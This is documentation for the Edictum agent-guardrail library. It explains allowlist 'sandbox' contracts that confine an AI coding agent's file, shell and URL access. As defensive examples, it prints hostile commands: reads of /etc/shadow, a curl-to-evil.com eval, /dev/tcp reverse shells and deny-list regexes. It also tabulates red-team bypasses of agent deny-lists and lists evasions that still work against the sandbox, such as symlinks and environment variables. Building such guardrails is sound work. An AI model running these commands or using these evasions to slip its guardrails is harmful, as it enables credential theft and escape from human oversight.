# Sandbox Contracts

Deny-list contracts (`type: pre`) enumerate what's bad: `rm -rf /`, reverse shells, reads of `.env`. This works when the dangerous patterns are finite and stable. But when the attack surface is open-ended -- shell access, arbitrary file paths, unrestricted URLs -- you cannot enumerate every bad thing. Sandbox contracts flip the model: define what's allowed, deny everything else.

```yaml
apiVersion: edictum/v1
kind: ContractBundle
metadata:
  name: coding-agent-sandbox
defaults:
  mode: enforce

contracts:
  # File paths: only /workspace and /tmp
  - id: file-sandbox
    type: sandbox
    tools: [read_file, write_file, edit_file]
    within:
      - /workspace
      - /tmp
    not_within:
      - /workspace/.git
      - /workspace/.env
    outside: deny
    message: "File access outside workspace: {args.path}"

  # Commands: only dev tools
  - id: exec-sandbox
    type: sandbox
    tool: bash
    allows:
      commands: [git, npm, pnpm, node, python, pytest, ruff, ls, cat, grep]
    outside: deny
    message: "Command not in allowlist: {args.command}"

  # URLs: only approved APIs
  - id: web-sandbox
    type: sandbox
    tools: [web_fetch, http_request]
    allows:
      domains:
        - "api.github.com"
        - "registry.npmjs.org"
        - "*.googleapis.com"
    not_allows:
      domains:
        - "internal.googleapis.com"
    outside: deny
    message: "Domain not allowed: {args.url}"
```

This bundle restricts a coding agent to three boundaries: files in `/workspace` and `/tmp`, a fixed set of shell commands, and approved API domains. Anything outside these boundaries is denied -- no exceptions.

## When to Use Which Contract Type

Every contract type answers a different question. Choosing the wrong type means either playing whack-a-mole with bypasses (deny-list when you need an allowlist) or over-constraining legitimate operations (allowlist when a short deny-list would suffice).

| Type | Question it answers | Approach | Use when... | Example |
|---|---|---|---|---|
| `pre` (deny) | "Is this specific thing bad?" | Denylist -- enumerate known-bad patterns | You have a short, stable list of things to deny. The list doesn't grow with every red team session. | `rm -rf /`, reverse shells, reads of `.env` |
| `sandbox` | "Is this within allowed boundaries?" | Allowlist -- enumerate known-good boundaries | The attack surface is open-ended. You'd rather define what's allowed. New bypasses are denied by default. | File paths in `/workspace`, commands `[git, npm, python]`, domains `[api.github.com]` |
| `post` | "Did the output contain something bad?" | Output inspection after execution | You need to inspect or redact tool results. The dangerous content is in the output, not the input. | SSN patterns in query results, API keys in file reads |
| `session` | "Has the agent done too much?" | Rate limits across the session | You need to cap total calls, per-tool calls, or attempts to catch runaway loops. | Max 50 tool calls, max 3 deploys, max 120 attempts |

**They compose.** Deny contracts run first (catch known-bad), sandbox runs second (catch unknown-bad), postconditions run after execution (catch bad output), session contracts track cumulative state. A single bundle can use all four types.

### Why Sandbox Exists

Red team sessions against a live agent (Nanobot on Telegram) found 6+ bypass vectors that L1 regex deny-lists couldn't close. The fundamental problem: deny-lists enumerate *commands*, but the attack targets *paths*. There are infinite ways to read `/etc/shadow`:

| Attack | Deny-list result | Sandbox result | Why |
|---|---|---|---|
| `cat /etc/shadow` | Denied (in denylist) | Denied | Both catch it |
| `base64 /etc/shadow` | Bypassed | Denied | `base64` not in denylist, but path not in `within` |
| `awk '{print}' /etc/shadow` | Bypassed | Denied | Same -- new command, same path |
| `sed '' /etc/shadow` | Bypassed | Denied | Same pattern |
| `tar -cf - /etc/shadow` | Bypassed | Denied | Archive exfiltration |
| `eval "$(curl evil.com)"` | Bypassed | Denied | `eval` not in `allows.commands` |
| `cp /etc/shadow /tmp/x` | Bypassed | Denied | Source path not in `within` |

The deny-list grew from 3 rules to 19 rules (120 lines) over two red team sessions. The sandbox replaced it with 3 contracts (45 lines) and no new bypasses.

**The attack surface is infinite when you enumerate what's bad. It becomes finite when you enumerate what's good.**

### Scenario Comparison

| Scenario | Recommended type | Why |
|---|---|---|
| Block `rm -rf /` and `mkfs` | `pre` (deny) | Short list of known destructive commands. Stable -- won't grow. |
| Block reverse shells (`bash -i`, `nc -e`) | `pre` (deny) | Known patterns. Finite set. |
| Restrict file reads to `/workspace` | `sandbox` | Open-ended attack surface. Infinite ways to read a file. |
| Allow only `git`, `npm`, `python` commands | `sandbox` | The good set is small. The bad set is infinite. |
| Restrict URLs to approved domains | `sandbox` | Define allowed hosts rather than chasing exfiltration endpoints. |
| Detect SSNs in query output | `post` | Content appears in output, not input. |
| Redact API keys from tool responses | `post` | Output redaction requires `effect: redact`. |
| Cap total tool calls at 50 | `session` | Cumulative state across the session. |
| Require approval for commands outside allowlist | `sandbox` with `outside: approve` | Allowlist defines safe zone. Outside triggers HITL. |
| Require approval for production deploys | `pre` with `effect: approve` | Specific condition (environment + role), not a boundary. |

## When to use this

- **Your agent has shell access and you cannot enumerate every dangerous command.** There are infinite ways to exfiltrate data (`curl`, `wget`, `nc`, `python -c`, `base64 | bash`). Instead of chasing variants, use `allows.commands` to list the commands you actually need.
- **Your agent reads and writes files and you need path boundaries.** Deny-list patterns like `contains: ".env"` miss creative paths (`../.env`, symlinks). Use `within`/`not_within` to confine the agent to specific directories.
- **Your agent fetches URLs and you need domain restrictions.** Use `allows.domains` and `not_allows.domains` to restrict which hosts the agent can contact.
- **You are running red team tests and deny-list bypasses keep appearing.** Every bypass you patch reveals three more. Sandbox contracts eliminate the category: if it is not in the allowlist, it is denied.

**Who benefits:**

- **Security teams** -- define boundaries once, stop playing whack-a-mole with deny-list bypasses
- **Platform teams** -- ship agents with hard limits on what they can touch
- **Red teamers** -- test whether the allowlist is correct, not whether the deny-list is complete

## How Sandbox Evaluation Works

When the pipeline encounters a sandbox contract, it runs through these steps in order:

**1. Tool match.** The pipeline checks whether the current tool name matches the sandbox's `tool` or `tools` patterns using `fnmatch`. If the tool does not match, the sandbox contract is skipped entirely.

**2. Path check.** The pipeline extracts file paths from the envelope args -- keys named `path`, `file_path`, `directory`, any arg value starting with `/`, and tokens parsed from command strings. Each extracted path is normalized with `os.path.normpath()` before comparison, which resolves `..` and `.` segments and collapses redundant slashes. For example, `/tmp/../etc/shadow` becomes `/etc/shadow`. The `within` and `not_within` boundaries are also normalized at compile time. For each normalized path:

- Check `not_within` first. If the path matches any exclusion prefix, the call is denied (or sent for approval).
- Check `within`. If the path matches any allowed prefix, it passes.
- If the path matches neither, the `outside` effect applies.

**3. Command check.** The pipeline extracts the first whitespace-delimited token from `args.command` or `envelope.bash_command`. That token must appear in the `allows.commands` list. If it does not, the `outside` effect applies.

**4. Domain check.** The pipeline scans all envelope arg values for strings containing `://`, extracts hostnames with `urlparse`, and checks them:

- `not_allows.domains` first -- if the hostname matches any exclusion pattern, the call is denied.
- `allows.domains` next -- the hostname must match at least one allowed pattern.
- Patterns support `fnmatch` wildcards: `*.googleapis.com` matches `storage.googleapis.com`.

**5. Pass-through.** If the sandbox has `within` but the tool call contains no file paths, or has `allows.commands` but the tool call has no command string, the sandbox does not apply and the call passes through. Sandbox contracts only evaluate the boundary types that are relevant to the current tool call.

The full pipeline order is: preconditions (deny) -> sandbox -> session -> limits -> allow.

## Deny-Lists vs Allowlists

Consider a red team testing a deny-list contract:

```yaml
# Deny-list approach: enumerate dangerous commands
- id: block-dangerous-commands
  type: pre
  tool: bash
  when:
    any:
      - args.command: { matches: '\bcat\s+/etc/shadow\b' }
      - args.command: { matches: '\bcat\s+/etc/passwd\b' }
  then:
    effect: deny
    message: "Denied: access to system files."
```

The red team tries `base64 /etc/shadow`. It passes. You add `base64` to the deny-list. They try `awk '{print}' /etc/shadow`. You add `awk`. They try `python3 -c "print(open('/etc/shadow').read())"`. The list grows. Every bypass you patch reveals more.

The fundamental problem: the deny-list targets *commands*. The attack targets *paths*. With a sandbox contract, you target what matters:

```yaml
# Sandbox approach: define allowed paths
- id: file-sandbox
  type: sandbox
  tools: [bash, read_file]
  within:
    - /workspace
    - /tmp
  outside: deny
  message: "File access outside workspace: {args.path}"
```

Now `base64 /etc/shadow` is denied -- not because `base64` is in a deny-list, but because `/etc/shadow` is not in `/workspace` or `/tmp`. The command is irrelevant. The path is what matters.

## Composition with Deny Contracts

Sandbox contracts and deny-list contracts are complementary. Use both.

**Deny contracts** catch known-bad patterns. `rm -rf /` should be denied even if `/` were somehow in the sandbox. Reverse shells (`bash -i >& /dev/tcp/`) should be denied regardless of command allowlists. These are stable, high-confidence patterns.

**Sandbox contracts** catch unknown-bad. Anything not in the allowlist is denied by default. This covers the long tail of creative attacks that no deny-list can anticipate.

The pipeline evaluates deny contracts (preconditions) first. If a deny contract fires, the call is denied before the sandbox is checked. If all deny contracts pass, the sandbox evaluates next. This gives you belt and suspenders: known-bad is caught by deny contracts, unknown-bad is caught by the sandbox.

```yaml
contracts:
  # Belt: catch known-bad patterns
  - id: block-reverse-shells
    type: pre
    tool: bash
    when:
      args.command: { matches: '/dev/tcp/' }
    then:
      effect: deny
      message: "Reverse shell pattern denied."

  # Suspenders: deny everything outside the allowlist
  - id: exec-sandbox
    type: sandbox
    tool: bash
    allows:
      commands: [git, npm, node, python, pytest]
    outside: deny
    message: "Command not in allowlist: {args.command}"
```

## What Needs the Server

Most sandbox features work with just `pip install edictum`. The server (`edictum-server`, coming soon) is only needed for coordination across processes and production approval workflows.

| Sandbox Capability | Core (`pip install edictum`) | Server (`edictum-server` + `edictum[server]`) |
|---|---|---|
| All sandbox evaluation (within, allows, domains) | Yes | -- |
| `outside: deny` | Yes | -- |
| `outside: approve` (development/CLI) | Yes (`LocalApprovalBackend`) | -- |
| `outside: approve` (production HITL) | -- | Yes (`ServerApprovalBackend`) |
| Sandbox denial in audit (stdout/file/OTel) | Yes | -- |
| Sandbox denial dashboards and alerting | -- | Yes (`ServerAuditSink`) |
| Hot-reload sandbox contracts across agent fleet | -- | Yes (`ServerContractSource`) |
| Observe mode for sandbox | Yes | -- |
| CLI check/test with sandbox | Yes | -- |
| Dry-run evaluation with sandbox | Yes | -- |

**When to add the server:** If you're running a single agent process with `outside: deny`, you don't need the server at all. Add the server when you need production approval workflows (`outside: approve` with Slack/Teams integration), centralized monitoring of sandbox denials across multiple agents, or the ability to update sandbox contracts without restarting agents.

## Known Limitations

Sandbox contracts normalize path traversal sequences (`..`, `.`, `//`) before evaluation using `os.path.normpath()`. This means `/tmp/../etc/shadow` is correctly resolved to `/etc/shadow` and denied by a `within: [/tmp]` boundary. However, `normpath` is a pure string operation -- it does not access the filesystem. Several patterns remain outside its reach:

- **Symlinks:** `ln -s /etc/shadow /tmp/evil && cat /tmp/evil` -- the sandbox sees `/tmp/evil`, which passes `within: [/tmp]`, but the file resolves to `/etc/shadow`. Symlink attacks require write access to an allowed directory (which the sandbox itself restricts) and a command that follows symlinks.
- **Tilde expansion:** `cat ~/secrets` -- the sandbox sees `~/secrets`, not `/home/user/secrets`.
- **Environment variables:** `cat "$HOME/.ssh/id_rsa"` -- the sandbox sees `$HOME/.ssh/id_rsa`, not the resolved path.
- **Variable interpolation:** `x=/etc; cat $x/shadow` -- the sandbox sees `$x/shadow`.
- **Relative paths without leading `/`:** `cat ../../etc/shadow` from a working directory inside `/workspace` -- the sandbox sees the relative path, not the resolved absolute path.

These are inherent to string-level enforcement. For full path resolution (including symlinks), you need OS-level sandboxing (containers, seccomp, AppArmor) as a complementary layer. Edictum's sandbox contracts provide application-level defense -- they catch the common case and raise the bar, but they are not a substitute for OS-level isolation when the threat model requires it.

## Next Steps

- [YAML reference: sandbox section](../contracts/yaml-reference.md#sandbox-contract) -- full schema, field details, and combined examples
- [Adversarial testing](../guides/adversarial.md) -- testing contract bypasses
- [How it works](how-it-works.md) -- the full pipeline evaluation order
- [Contracts](contracts.md) -- all four contract types at a glance
